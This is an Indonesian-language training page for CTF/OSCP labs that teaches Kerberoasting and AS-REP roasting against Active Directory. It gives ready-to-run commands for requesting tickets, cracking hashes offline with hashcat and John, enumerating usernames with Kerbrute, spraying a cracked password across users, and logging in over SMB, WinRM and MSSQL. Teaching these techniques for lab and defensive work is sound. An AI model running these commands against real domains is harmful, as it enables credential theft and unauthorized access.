---
id: "37"
title: "🔥 Workflow 37 — Kerberoasting & AS-REP Roasting"
category: "4. Active Directory"
categoryId: "ad"
filename: "37_kerberoasting_asreproasting_workflow.md"
refs_out: ["05","06","11","12","14a","14b","36","38","42","43","45","46"]
refs_in: ["05","09","10","14b","35","36","39","42","43","46","53","54","63","65"]
---

# 🔥 Workflow 37 — Kerberoasting & AS-REP Roasting
← [File 36: BloodHound](/docs/ad-bloodhound) → [File 38: AD ACL Abuse](/docs/ad-acl-abuse)

> **Konteks:** Active Directory Attack & Pentest Documentation — CTF / OSCP-style Labs  
> **Platform:** Parrot OS XFCE (Debian-based)  
> **Target:** Pemula dari nol  
> **Tujuan:** Membangun _muscle memory_ untuk mengenali, melakukan, menganalisis, dan menindaklanjuti Kerberoasting serta AS-REP Roasting.

---

## 🧭 0. Gambaran Besar Workflow

Kerberoasting dan AS-REP Roasting sama-sama memanfaatkan cara kerja Kerberos untuk mendapatkan material kriptografi yang dapat dicoba di-_crack_ secara offline. Namun titik serangannya berbeda:

- **Kerberoasting** mencari akun user yang memiliki **SPN** lalu meminta **TGS/service ticket** untuk service tersebut.
    
- **AS-REP Roasting** mencari user yang memiliki flag `**UF_DONT_REQUIRE_PREAUTH**`, sehingga attacker dapat memperoleh **AS-REP** tanpa mengetahui password user terlebih dahulu.
    

Mindset utama:

> **Jangan langsung berpikir “roast semua”. Cari kondisi yang membuat roasting masuk akal, ambil hash, crack offline, validasi credential, lalu kembali ke Active Directory untuk mencari jalur privilege berikutnya.**

### 🔄 Workflow Ringkas

```
[MASUK KE AD ENVIRONMENT]
          │
          ▼
 [Kenali Domain + DC + User]
          │
          ├───────────────┐
          │               │
          ▼               ▼
 [AS-REP Roasting]   [Kerberoasting]
          │               │
          ▼               ▼
 [krb5asrep hash]   [krb5tgs hash]
          │               │
          └───────┬───────┘
                  ▼
          [Offline Cracking]
                  │
          ┌───────┴────────┐
          │                │
       BERHASIL          GAGAL
          │                │
          ▼                ▼
 [Validasi Credential] [Wordlist/Rules]
          │                │
          ▼                └──────► [Crack ulang]
 [SMB / WinRM / MSSQL]
          │
          ▼
 [BloodHound + ACL + Privilege]
          │
          ▼
 [Lanjut ke Attack Path]
```

---

# 🔐 BAGIAN 1 — KERBEROS FUNDAMENTALS (KONTEKS SERANGAN)

## 1.1 🏛️ Cara Kerja Kerberos — Simplified

Kerberos adalah protokol autentikasi yang digunakan Active Directory. Untuk memahami roasting, cukup kuasai tiga komponen utama:

- **AS (Authentication Server)** — meminta dan menerbitkan TGT.
    
- **TGS (Ticket Granting Server)** — menerbitkan service ticket/TGS.
    
- **Service** — resource seperti MSSQL, HTTP, CIFS/SMB, dan service lain yang memiliki SPN.
    

### 📐 Diagram Kerberos

```
                   ACTIVE DIRECTORY / KDC
              ┌──────────────────────────────┐
              │                              │
              │  AS (Authentication Server)  │
              │  TGS (Ticket Granting Server)│
              │                              │
              └──────────────┬───────────────┘
                             │

1. REQUEST TGT
   Client ────────────────► AS
            "Saya ingin TGT"

2. AS MENGIRIM TGT
   Client ◄──────────────── AS
            TGT
            │
            └── TGT diproteksi menggunakan secret KRBTGT

3. REQUEST SERVICE TICKET / TGS
   Client ────────────────► TGS
            "Saya butuh ticket untuk MSSQLSvc/..."

4. TGS MENGIRIM SERVICE TICKET
   Client ◄──────────────── TGS
            Service Ticket
            │
            └── Ticket terkait service account

5. PRESENT TICKET KE SERVICE
   Client ────────────────► Service
            "Ini Service Ticket saya"

6. SERVICE MEMVALIDASI TICKET
   Service ───────────────► Client
            Akses diberikan / ditolak
```

> **Analogi:** **TGT = tanda masuk gedung**, sedangkan **TGS = kunci ruangan spesifik**.
> 
> Anda masuk gedung menggunakan tanda masuk umum (TGT). Setelah berada di dalam, Anda meminta kunci untuk ruangan tertentu (TGS/service ticket). Pada Kerberoasting, ticket service tertentu menjadi material yang dapat dicoba di-_crack_ secara offline.

### 🧠 Apa yang Perlu Diingat Attacker?

```
TGT
 │
 └── berkaitan dengan KRBTGT

TGS / Service Ticket
 │
 └── berkaitan dengan service account yang memiliki SPN

AS-REP
 │
 └── dapat keluar tanpa pre-auth jika account dikonfigurasi demikian
```

---

## 1.2 🧩 Konsep yang WAJIB Dipahami Sebelum Serangan

### 📌 Apa itu SPN (Service Principal Name)?

SPN adalah identifier yang mengaitkan sebuah service dengan account yang digunakan untuk menjalankan service tersebut.

Format umum yang perlu dikenali:

```
ServiceClass/Host:Port/ServiceName
```

Contoh:

```
MSSQLSvc/sql01.corp.local:1433
```

Interpretasi:

```
MSSQLSvc              → jenis service
sql01.corp.local      → host
1433                  → port
```

SPN penting untuk Kerberoasting karena Kerberos membutuhkan identitas service ketika menerbitkan service ticket. User/domain principal yang berhak dapat meminta ticket tersebut untuk service yang memiliki SPN.

### 📌 Apa itu `UF_DONT_REQUIRE_PREAUTH`?

Flag ini menunjukkan bahwa account **tidak mewajibkan Kerberos pre-authentication**.

Pada konfigurasi normal, client perlu membuktikan pengetahuannya terhadap secret/password sebelum mendapatkan AS-REP. Saat flag ini aktif, KDC dapat merespons permintaan AS untuk user tersebut tanpa pre-authentication.

Itulah kondisi yang membuat **AS-REP Roasting** memungkinkan.

### 📌 TGT vs TGS vs AS-REP dari Perspektif Attacker

|Material|Terkait dengan|Nilai bagi attacker|
|---|---|---|
|**TGT**|KRBTGT|Sangat sensitif; bukan target utama roasting biasa|
|**TGS**|Service account / SPN|Dapat menjadi hash `krb5tgs` untuk offline cracking|
|**AS-REP**|User account tanpa pre-auth|Dapat menjadi hash `krb5asrep` untuk offline cracking|

Secara mental:

```
TGT
 └── KRBTGT secret → sulit → relevan untuk ticket attacks

TGS
 └── Service account secret → Kerberoasting

AS-REP
 └── User secret → AS-REP Roasting
```

---

## 1.3 📊 Tabel Perbandingan Cepat

|Aspek|Kerberoasting|AS-REP Roasting|
|---|---|---|
|Target|Service accounts dengan SPN|User dengan `DONT_REQUIRE_PREAUTH`|
|Butuh auth?|Ya, biasanya domain user yang sudah terautentikasi|Tidak untuk skenario username-based AS-REP roasting|
|Material|TGS / Service Ticket|AS-REP|
|Hash umum|`$krb5tgs$23$...`|`$krb5asrep$23$...`|
|Hashcat mode|**13100**|**18200**|
|Target discovery|SPN|`UF_DONT_REQUIRE_PREAUTH`|
|Crack|Offline|Offline|
|Prevalensi di CTF|Sangat tinggi|Tinggi|
|Severity|High|High|

### 🧠 Mnemonic

```
SPN              → TGS              → 13100 → KERBEROAST
NO PREAUTH       → AS-REP           → 18200 → AS-REP ROAST
```

---

# 🔥 BAGIAN 2 — KERBEROASTING

## 2.1 🎯 Konsep Kerberoasting

> [!NOTE]\n> **Setup Cepat** (variabel penting)\n> ```bash\n> export DC_IP=10.10.10.10\n> export DOMAIN=example.local\n> export USERNAME=labuser\n> export PASSWORD='Password123!'\n> ```

Kerberoasting adalah teknik mendapatkan service ticket untuk account yang memiliki SPN, kemudian menggunakan material ticket tersebut untuk mencoba menebak password account secara offline.

### ❓ Mengapa setiap domain user dapat request TGS untuk service tertentu?

Karena itu merupakan bagian dari model akses Kerberos. Service perlu menyediakan mekanisme bagi principal yang sah untuk mendapatkan ticket agar dapat menggunakan service tersebut.

Kerberoasting menyalahgunakan fakta bahwa **ticket request itu legitimate**, tetapi attacker berharap secret service account yang mendasarinya lemah.

### ❓ Apakah ini bug Kerberos?

Bukan dalam arti “Kerberos rusak”. Teknik ini lebih tepat dipahami sebagai **abuse terhadap fitur autentikasi yang legitimate**, ditambah kelemahan operational security pada service account, misalnya:

- password lemah;
    
- password mudah ditebak;
    
- password lama;
    
- password jarang dirotasi;
    
- service account memiliki privilege lebih besar daripada yang dibutuhkan.
    

### ✅ Kondisi yang membuat Kerberoasting berhasil

```
SPN tersedia
      │
      ▼
Service account dapat di-request ticket
      │
      ▼
Ticket material berhasil diperoleh
      │
      ▼
Password service account lemah / dapat ditebak
      │
      ▼
Offline cracking berhasil
```

### 🥤 Analogi Pemula

Bayangkan sebuah gedung menyediakan kunci untuk setiap ruangan. Anda tidak “membobol” pintu untuk mendapatkan kunci; Anda meminta kunci melalui prosedur normal. Masalah muncul ketika kunci tersebut dibuat dari kode rahasia yang terlalu sederhana. Anda membawa salinan material itu pulang lalu mencoba menebak kode secara offline.

---

## 2.2 🔎 Fase 1 — Enumeration SPN (Cari Target)

### 🎯 Tujuan

Identifikasi account yang memiliki SPN dan menentukan kandidat mana yang paling menarik untuk di-request.

### 🐧 Dari Linux — Impacket `GetUserSPNs`

Ini adalah tool utama untuk workflow Linux.

```
# ENUMERATE SPN DENGAN DOMAIN CREDENTIALS
# -dc-ip menentukan domain controller yang menjadi KDC/LDAP target.
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD

# REQUEST TGS LANGSUNG SEKALIGUS
# -request meminta service ticket sehingga hasil dapat dipakai untuk cracking.
impacket-GetUserSPNs -dc-ip $DC_IP \
  $DOMAIN/$USERNAME:$PASSWORD \
  -request

# SIMPAN HASIL KE FILE UNTUK CRACKING
# File memudahkan pemrosesan dengan hashcat/john.
impacket-GetUserSPNs -dc-ip $DC_IP \
  $DOMAIN/$USERNAME:$PASSWORD \
  -request \
  -outputfile spn_hashes.txt

# GUNAKAN NTLM HASH JIKA SUDAH MEMILIKINYA
# Format -hashes :NTLM_HASH berarti LM hash dikosongkan dan NT hash digunakan.
impacket-GetUserSPNs -dc-ip $DC_IP \
  $DOMAIN/$USERNAME \
  -hashes :$NTLM_HASH \
  -request \
  -outputfile spn_hashes.txt
```

### 📤 Contoh Output Realistis

```
ServicePrincipalName                   Name          MemberOf  PasswordLastSet             LastLogon
-------------------------------------  ------------  --------  --------------------------  --------------------------
MSSQLSvc/sql01.corp.local:1433        svc_sql                 2023-01-15 10:23:11.123456  2024-01-20 09:15:33.445566
HTTP/web01.corp.local                  svc_web                 2022-06-01 08:00:00.000000  <never>
```

### 🔎 Cara Menganalisis Output

`**PasswordLastSet**` **lama**

Bukan bukti password pasti lemah, tetapi merupakan sinyal prioritas. Password yang lama dan tidak pernah dirotasi lebih layak diuji daripada service account yang baru saja mengganti credential.

`**LastLogon <never>**`

Menunjukkan account belum memiliki logon interaktif yang tercatat dalam field tersebut. Account tetap dapat menjadi target selama account/service principal valid.

**Banyak SPN**

Lebih banyak SPN berarti lebih banyak candidate service account yang bisa diprioritaskan.

### 🪟 Dari Windows — PowerView

```
# ENUMERATE USER DENGAN SPN
# Hasil memperlihatkan account dan service principal yang terkait.
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# REQUEST TGS UNTUK SPN TERTENTU
# Cocok untuk targeted Kerberoasting.
Get-DomainSPNTicket -SPN "MSSQLSvc/sql01.corp.local:1433"

# KERBEROAST SEMUA SPN DAN KELUARKAN FORMAT HASHCAT
# Hash diekstrak lalu disimpan ke file ASCII.
Invoke-Kerberoast -OutputFormat Hashcat |
  Select-Object -ExpandProperty hash |
  Out-File -FilePath kerberoast_hashes.txt -Encoding ascii
```

### 🪟 Dari Windows — Rubeus

```
:: KERBEROAST SEMUA SERVICE ACCOUNT
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

:: TARGET USER SPESIFIK
Rubeus.exe kerberoast /user:svc_sql /outfile:kerberoast_svc_sql.txt

:: FORMAT HASHCAT
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt

:: /nowrap MENJAGA HASH TETAP DALAM SATU BARIS
Rubeus.exe kerberoast /nowrap
```

### 🐧 Dengan NetExec / CrackMapExec

```
# NETEXEC — ENUMERASI + REQUEST KERBEROAST MATERIAL
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD --kerberoasting spn_hashes.txt

# CRACKMAPEXEC — VERSI LAMA / ENVIRONMENT LEGACY
crackmapexec ldap $DC_IP -u $USERNAME -p $PASSWORD --kerberoasting spn_hashes.txt
```

### 🪶 Dengan `ldapsearch` — Manual

```
# QUERY LDAP UNTUK SEMUA USER YANG MEMILIKI SPN
# Ini berguna untuk memahami sumber data yang digunakan tool otomatis.
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName passwordLastSet
```

### 📤 Output yang Diharapkan

```
- Daftar service accounts / users yang memiliki SPN
- SPN yang terkait
- Password last set date
- Last logon / atribut relevan lainnya jika diminta
```

### 🔎 Heuristik Prioritas

|Indikator|Makna praktis|Prioritas|
|---|---|---|
|SPN ada|Account kandidat Kerberoasting|Tinggi|
|`PasswordLastSet` sangat lama|Kemungkinan password stale|Tinggi|
|`svc_`, `service_`, `sql_`, `http_`|Nama service account klasik|Sedang–tinggi|
|Privilege tinggi|Dampak bila password ditemukan bisa besar|Sangat tinggi|
|Account jarang/nyaris tidak aktif|Tidak otomatis aman|Tetap perlu dianalisis|

> **Penting:** `PasswordLastSet` lama **bukan bukti** password lemah. Itu hanya indikator untuk menentukan prioritas.

---

## 2.3 🎫 Fase 2 — Request TGS Ticket

Setelah menemukan SPN, Anda bisa meminta TGS untuk service tersebut.

### 🧠 Kenapa ini bisa dilakukan?

Karena Kerberos memang dirancang supaya principal yang terautentikasi dapat memperoleh service ticket untuk layanan yang dapat diaksesnya.

Yang menjadi masalah bagi attacker adalah hasil request tersebut membawa encrypted material yang berkaitan dengan account/service principal. Material inilah yang kemudian bisa dicoba di-_crack_ secara offline.

### 📌 Format Hash

Hash umum etype 23 terlihat seperti:

```
$krb5tgs$23$*...
```

### 🐧 Request Targeted TGS

```
# REQUEST TGS HANYA UNTUK ACCOUNT TARGET
# Berguna untuk targeted approach dan mengurangi request yang tidak perlu.
impacket-GetUserSPNs -dc-ip $DC_IP \
  $DOMAIN/$USERNAME:$PASSWORD \
  -request-user svc_sql \
  -outputfile svc_sql_hash.txt

# VERIFIKASI OUTPUT
# Ambil beberapa baris pertama untuk memeriksa format.
head -3 svc_sql_hash.txt
```

Expected beginning:

```
$krb5tgs$23$*
```

### ✅ Checklist Validasi Hash

```
[ ] File benar-benar terisi
[ ] Hash berada pada satu baris utuh
[ ] Prefix sesuai $krb5tgs$
[ ] Etype sesuai dengan mode cracking yang dipilih
[ ] Username/service account sesuai target
```

---

## 2.4 🧨 Fase 3 — Offline Password Cracking

Tujuan fase ini bukan “decrypt ticket secara langsung”. Tujuannya adalah mencoba kandidat password terhadap material hash yang diperoleh.

### 🎮 Hashcat — GPU Cracking

```
# MODE 13100 = KERBEROS 5 TGS / ETYPE 23 (RC4)
# -a 0 = straight/dictionary attack
# -w 3 = workload profile tinggi
hashcat -m 13100 spn_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -w 3 \
  --force

# DICTIONARY + RULES
# Rules mengubah candidate password sehingga lebih banyak variasi diuji.
hashcat -m 13100 spn_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -w 3

# JIKA MATERIAL YANG DIPEROLEH ADALAH KERBEROS AES256
# Gunakan mode yang sesuai dengan jenis hash yang benar-benar dimiliki.
hashcat -m 19700 spn_hashes.txt \
  /usr/share/wordlists/rockyou.txt

# TAMPILKAN HASIL YANG SUDAH DI-CRACK
hashcat -m 13100 spn_hashes.txt --show
```

### 🖥️ John the Ripper — Alternatif CPU

```
# DICTIONARY ATTACK
john spn_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=krb5tgs

# TAMPILKAN PASSWORD YANG BERHASIL
john spn_hashes.txt --show --format=krb5tgs
```

### 📤 Contoh Output Cracking

```
$krb5tgs$23$*svc_sql*CORP.LOCAL*...[hash]...:Summer2023!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

### 🔎 Analisis

Ketika hash berhasil di-crack:

```
TGS hash
   │
   ▼
Password service account diketahui
   │
   ├──► Validasi login ke service terkait
   ├──► Cek SMB / WinRM jika relevan
   ├──► Cek BloodHound
   ├──► Cek password reuse secara terkontrol
   └──► Analisis privilege dan ACL
```

> **Jangan menganggap service account otomatis admin.** Nilai utama credential baru harus dibuktikan melalui enumerasi akses berikutnya.

---

## 2.5 🚪 Fase 4 — Setelah Dapat Password

Contoh:

```
Password svc_sql didapat: "Summer2023!"
```

### 🌳 Decision Tree

```
Password service account didapat
             │
      ┌──────┼─────────────┐
      │      │             │
      ▼      ▼             ▼
    MSSQL   SMB          WinRM
      │      │             │
      ▼      ▼             ▼
  Validasi Validasi      Validasi
      │      │             │
      └──────┼─────────────┘
             ▼
       BloodHound / ACL
             │
      ┌──────┴──────┐
      │             │
      ▼             ▼
 privilege rendah  jalur privilege
      │             │
      ▼             ▼
  cari pivot      lanjut exploit path
```

### 🗄️ Test MSSQL

```
# COBA AUTENTIKASI KE MSSQL
# Sesuaikan TARGET dengan host MSSQL yang ditemukan saat enumeration.
impacket-mssqlclient $DOMAIN/svc_sql:Summer2023!@$TARGET
```

Setelah masuk, lakukan enumeration service sesuai scope lab. Jangan menganggap `xp_cmdshell` pasti aktif; cek konfigurasi terlebih dahulu.

### 📁 Test SMB

```
# UJI LOGIN SMB
nxc smb $DC_IP -u svc_sql -p 'Summer2023!'

# PERIKSA APAKAH ACCOUNT MEMILIKI ADMIN ACCESS
# Gunakan output NetExec untuk menentukan apakah host dapat diakses sebagai administrator.
nxc smb $TARGET -u svc_sql -p 'Summer2023!'
```

### 🪟 Test WinRM

```
# COBA REMOTE MANAGEMENT MELALUI WINRM
# Berhasil atau tidaknya tergantung listener, permission, dan group membership.
evil-winrm -i $TARGET -u svc_sql -p 'Summer2023!'
```

### 🕸️ BloodHound

Cari setidaknya:

```
svc_sql
   │
   ├── MemberOf
   ├── AdminTo
   ├── CanRDP
   ├── CanPSRemote
   ├── GenericAll
   ├── GenericWrite
   ├── WriteDacl
   ├── AddMember
   └── outbound object control
```
### 🔐 Password Reuse

Password service account kadang dipakai ulang. Dalam CTF/lab, validasikan secara hati-hati terhadap akun yang memang ada dalam target environment.

> [!WARNING]
> **Peringatan:** Menggunakan pola password yang sama dapat memicu account lockout pada lingkungan produksi.

```
# TEST PASSWORD YANG SAMA TERHADAP USER LIST DI LAB
# Jangan gunakan pola ini sembarangan di production karena dapat memicu lockout.
nxc smb $DC_IP -u users.txt -p 'Summer2023!'
```

---

# 🧯 BAGIAN 3 — AS-REP ROASTING

## 3.1 🧠 Konsep AS-REP Roasting

### 🔐 Apa itu Kerberos Pre-Authentication?

Pre-authentication adalah lapisan proteksi yang membantu KDC memastikan requester mengetahui secret yang benar sebelum KDC menghasilkan respons autentikasi.

Sederhananya:

```
Normal:
Client ── bukti pre-auth ──► KDC
KDC    ── AS-REP ─────────► Client
```

### ⚠️ Apa yang terjadi jika `UF_DONT_REQUIRE_PREAUTH` diset?

```
Attacker ── request AS untuk user ──► KDC
KDC      ── AS-REP tanpa pre-auth ──► Attacker
                         │
                         ▼
                 encrypted material
                         │
                         ▼
                  offline cracking
```

Inilah inti AS-REP Roasting.

### 🧩 Kenapa flag ini ada?

Umumnya karena kebutuhan compatibility/legacy atau salah konfigurasi. Flag tersebut sendiri bukan eksploitasi baru; **konfigurasi account-lah yang menciptakan kondisi roasting**.

### 🍪 Analogi

Normalnya resepsionis meminta Anda menunjukkan bukti bahwa Anda memiliki akses sebelum membuatkan badge. Pada account tanpa pre-auth, mekanisme pembuktian tersebut dilewati. Resepsionis tetap mengeluarkan paket respons yang dapat Anda bawa pulang dan analisis secara offline.

---

## 3.2 🔎 Fase 1 — Enumeration User Vulnerable

### 🕵️ Tanpa Credentials — Black-box Style

Pada skenario tertentu, Anda hanya membutuhkan daftar username yang valid.

```
# TARGET USER TERTENTU TANPA PASSWORD
# -no-pass berarti tidak mencoba password.
impacket-GetNPUsers -dc-ip $DC_IP \
  $DOMAIN/svc_backup \
  -no-pass

# GUNAKAN USERNAME LIST
# Semua username diuji terhadap KDC.
impacket-GetNPUsers -dc-ip $DC_IP \
  $DOMAIN/ \
  -usersfile users.txt \
  -no-pass \
  -outputfile asrep_hashes.txt

# FORMAT DOMAIN DENGAN SLASH DI AKHIR
# Cocok untuk skenario tanpa username/password.
impacket-GetNPUsers corp.local/ \
  -dc-ip $DC_IP \
  -usersfile users.txt \
  -no-pass \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### 🔑 Dengan Credentials — Lebih Reliable

```
# REQUEST AS-REP DARI ACCOUNT YANG RELEVAN
# -request meminta material AS-REP langsung.
impacket-GetNPUsers -dc-ip $DC_IP \
  $DOMAIN/$USERNAME:$PASSWORD \
  -request \
  -outputfile asrep_hashes.txt

# GUNAKAN NTLM HASH
impacket-GetNPUsers -dc-ip $DC_IP \
  $DOMAIN/$USERNAME \
  -hashes :$NTLM_HASH \
  -request \
  -outputfile asrep_hashes.txt
```

### 🐧 Dengan NetExec

```
# AS-REP ROASTING DENGAN DOMAIN CREDENTIALS
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD \
  --asreproast asrep_hashes.txt

# COBA MODE TANPA PASSWORD DI ENVIRONMENT YANG MENDUKUNG
nxc ldap $DC_IP -u '' -p '' \
  --asreproast asrep_hashes.txt
```

### 🪟 PowerView

```
# ENUMERATE USER YANG TIDAK MEMERLUKAN PRE-AUTH
Get-DomainUser -PreauthNotRequired |
  Select-Object samaccountname,useraccountcontrol

# REQUEST AS-REP MATERIAL UNTUK USER TARGET
Get-ASREPHash -UserName svc_backup -Verbose
```

### 🪟 Rubeus

```
:: AS-REP ROAST SEMUA USER YANG VULNERABLE
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt /nowrap

:: TARGET USER SPESIFIK
Rubeus.exe asreproast /user:svc_backup /format:hashcat /outfile:asrep_hash.txt
```

### 📤 Contoh Output Realistis

```
$krb5asrep$23$svc_backup@CORP.LOCAL:a1b2c3d4...[hash sangat panjang]...e5f6g7h8
```

### 🔎 Analisis Output

```
$krb5asrep$23$...
│        │
│        └── etype 23
└────────── jenis material AS-REP
```

Implikasinya:

- username target diketahui;
    
- account tidak memerlukan pre-auth dalam kondisi tersebut;
    
- material dapat dibawa ke offline cracking;
    
- password target tidak diperlukan untuk memperoleh material AS-REP pada workflow tanpa pre-auth.
    

---

## 3.3 🧨 Fase 2 — Offline Password Cracking

### 🎮 Hashcat

```
# MODE 18200 = KERBEROS 5 AS-REP ETYPE 23
hashcat -m 18200 asrep_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -w 3 \
  --force

# GUNAKAN RULES UNTUK MENAMBAH VARIASI PASSWORD
hashcat -m 18200 asrep_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -w 3

# TAMPILKAN HASH YANG SUDAH CRACKED
hashcat -m 18200 asrep_hashes.txt --show
```

### 🖥️ John the Ripper

```
# CRACK DENGAN ROCKYOU
john asrep_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=krb5asrep

# LIHAT HASIL
john asrep_hashes.txt --show --format=krb5asrep
```

### ✅ Cara Membaca Hasil

```
AS-REP hash
   │
   ▼
Password candidate testing
   │
   ├── found  → password diketahui
   └── not found → ubah candidate strategy
```

---

## 3.4 🚪 Fase 3 — Setelah Dapat Password

Contoh:

```
Password svc_backup didapat: "Backup2022"
```

### 🌳 Decision Tree

```
Password didapat
      │
      ├──► SMB login test
      │
      ├──► WinRM test
      │
      ├──► BloodHound
      │      ├── MemberOf
      │      ├── AdminTo
      │      ├── GenericAll
      │      ├── GenericWrite
      │      └── ACL / control paths
      │
      └──► Cek kemungkinan password reuse
```

Contoh validasi:

```
# TEST SMB
nxc smb $TARGET -u svc_backup -p 'Backup2022'

# TEST WINRM
# Jalankan hanya jika target memang memiliki WinRM dan account berhak menggunakannya.
evil-winrm -i $TARGET -u svc_backup -p 'Backup2022'
```

> Password ditemukan ≠ otomatis shell. Selalu pisahkan **credential acquisition** dari **privilege validation**.

---

# 👤 BAGIAN 4 — USERNAME ENUMERATION (PRE-REQUISITE)

## 4.1 🔍 Kerbrute — Username Enumeration via Kerberos

Untuk AS-REP Roasting tanpa credentials, username list menjadi input yang sangat penting.

### 📦 Install di Parrot OS

```
# DOWNLOAD RELEASE BINARY KERBRUTE
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64

# BERIKAN EXECUTE PERMISSION
chmod +x kerbrute_linux_amd64

# PINDAHKAN KE PATH GLOBAL
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### 🧪 Username Enumeration

```
# ENUM USERNAME VIA KERBEROS
# --dc menunjuk ke Domain Controller.
kerbrute userenum \
  --dc $DC_IP \
  -d $DOMAIN \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt

# WORDLIST NAMA YANG LEBIH KECIL / TERARAH
kerbrute userenum \
  --dc $DC_IP \
  -d $DOMAIN \
  /usr/share/seclists/Usernames/Names/names.txt
```

### 📤 Contoh Output

```
2024/01/15 10:23:45 >  Using KDC(s):
2024/01/15 10:23:45 >   10.10.10.100:88

2024/01/15 10:23:46 >  [+] VALID USERNAME:    administrator@corp.local
2024/01/15 10:23:46 >  [+] VALID USERNAME:    john.smith@corp.local
2024/01/15 10:23:47 >  [+] VALID USERNAME:    svc_backup@corp.local
```

### 🧠 Insight

Valid username belum berarti valid password.

```
VALID USERNAME
      │
      ├──► AS-REP Roast candidate?
      ├──► Kerberoast target? (jika SPN)
      ├──► Password spraying candidate?
      └──► BloodHound / LDAP correlation?
```

---

## 4.2 🪶 Username dari LDAP (Jika Punya Credentials)

```
# ENUMERATE USER DENGAN LDAP
# Field sAMAccountName dipilih karena biasanya menjadi username logon.
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" \
  sAMAccountName |
  grep sAMAccountName |
  awk '{print $2}' > all_users.txt
```

### 📤 Hasil

```
all_users.txt
├── administrator
├── john.smith
├── svc_backup
├── svc_sql
└── ...
```

---

## 4.3 📡 Username dari `enum4linux-ng`

```
# ENUMERATE USER INFORMATION DENGAN CREDENTIALS
# Kemudian tarik line yang berisi username.
enum4linux-ng -A $DC_IP \
  -u $USERNAME \
  -p $PASSWORD |
  grep "user:" |
  awk '{print $2}' > users.txt
```

---

# 📝 BAGIAN 5 — WORDLIST STRATEGY UNTUK KERBEROS CRACKING

Cracking bukan sekadar menjalankan `rockyou.txt` lalu menyerah. Gunakan strategi bertingkat.

## 5.1 🎯 Wordlist Prioritas untuk AD Environment

### 🥇 Tier 1 — Mulai dari yang murah

```
# WORDLIST KLASIK
/usr/share/wordlists/rockyou.txt

# SECLists CREDENTIALS PENDEK / UMUM
/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt

# WORDLIST ROCKYOU VARIAN
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

> [!TIP]\n> **Instalasi Seclists di Parrot OS**:\n> ```bash\n> sudo apt update && sudo apt install seclists\n> ```\n> Path default untuk wordlist rockyou pada Parrot OS adalah `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt`. Pastikan paket `seclists` sudah terpasang.
```

### 🥈 Tier 2 — Tambahkan Rules

```
# BEST64 — VARIASI UMUM YANG SERING MEMBERI HASIL
hashcat -m 13100 hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# D3AD0NE — RULESET ALTERNATIF
hashcat -m 13100 hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# ONERULETORULETHEMALL — RULESET LEBIH LUAS
hashcat -m 13100 hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

### 🥉 Tier 3 — Custom Context Wordlist

Context dapat meliputi nama perusahaan, project, product, website, nama service, tahun, atau kata yang sering muncul dalam environment lab.

```
# CONTOH CUSTOM WORDLIST BERBASIS KONTEKS LAB
# Buat kandidat sendiri sesuai informasi yang memang ditemukan saat recon.
printf '%s\n' \
  Corp2023! \
  Corp@2024 \
  Corp123 \
  Summer2023 \
  January2024 \
  > custom_ad_passwords.txt

# UJI CUSTOM WORDLIST DENGAN RULES
hashcat -m 13100 hash.txt custom_ad_passwords.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

### 🌐 CeWL — Bila Context Berasal dari Website Target

```
# AMBIL KATA DARI WEBSITE DALAM SCOPE LAB
# -d menentukan kedalaman crawl; -m minimum word length.
cewl http://$TARGET -d 3 -m 5 -o cewl_wordlist.txt

# CRACK MENGGUNAKAN WORDLIST HASIL CEWL
hashcat -m 13100 hash.txt cewl_wordlist.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

> Untuk real engagement, pastikan scraping dan wordlist generation sesuai scope. Dalam CTF/lab, gunakan informasi yang memang diberikan oleh target environment.

---

## 5.2 📊 Pattern Password yang Sering Muncul di CTF

|Pattern|Contoh|Kenapa sering|
|---|---|---|
|Nama + Tahun|`Summer2023`|Pola manusia yang mudah diprediksi|
|Nama Perusahaan + `!`|`Corp2024!`|Kebiasaan password onboarding|
|Service + Password|`Sql@dmin1`|Setup awal service|
|Bulan + Tahun|`January2024`|Password rotation berbasis kalender|
|Welcome Pattern|`Welcome1!`|Default onboarding / lab|

### ⚠️ Jangan Overfit

Password pattern di atas hanyalah **heuristik**. Jangan menganggap semua CTF menggunakan pattern yang sama. Gunakan urutan:

```
Evidence dari target
       ↓
Context words
       ↓
Candidate generation
       ↓
Rules
       ↓
Cracking
```

---

# ⚙️ BAGIAN 6 — ADVANCED SCENARIOS

## 6.1 🔐 Kerberoasting dengan AES Encryption

